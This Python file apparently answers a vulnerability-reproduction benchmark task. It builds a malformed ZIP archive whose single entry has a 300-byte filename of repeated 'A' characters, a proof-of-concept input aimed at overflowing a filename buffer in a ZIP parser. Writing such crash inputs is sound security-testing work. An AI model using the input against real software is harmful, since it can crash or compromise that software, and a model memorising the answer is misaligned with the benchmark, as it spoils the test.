import struct
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        filename_len = 300
        filename = b"A" * filename_len
        data = b""
        crc32 = zlib.crc32(data) & 0xFFFFFFFF

        local_header_sig = 0x04034B50
        central_header_sig = 0x02014B50
        eocd_sig = 0x06054B50

        ver_needed = 20
        ver_made = 20
        flags = 0
        compression = 0
        mod_time = 0
        mod_date = 0
        comp_size = len(data)
        uncomp_size = len(data)
        fname_len = len(filename)
        extra_len = 0

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            local_header_sig,
            ver_needed,
            flags,
            compression,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fname_len,
            extra_len,
        ) + filename

        local_offset = 0
        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            central_header_sig,
            ver_made,
            ver_needed,
            flags,
            compression,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fname_len,
            0,  # extra field length
            0,  # file comment length
            0,  # disk number start
            0,  # internal file attributes
            0,  # external file attributes
            local_offset,
        ) + filename

        cd_offset = len(local_header) + len(data)
        cd_size = len(central_header)

        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            0,  # number of this disk
            0,  # number of the disk with the start of the central directory
            1,  # total entries on this disk
            1,  # total entries
            cd_size,
            cd_offset,
            0,  # zip file comment length
        )

        return local_header + data + central_header + eocd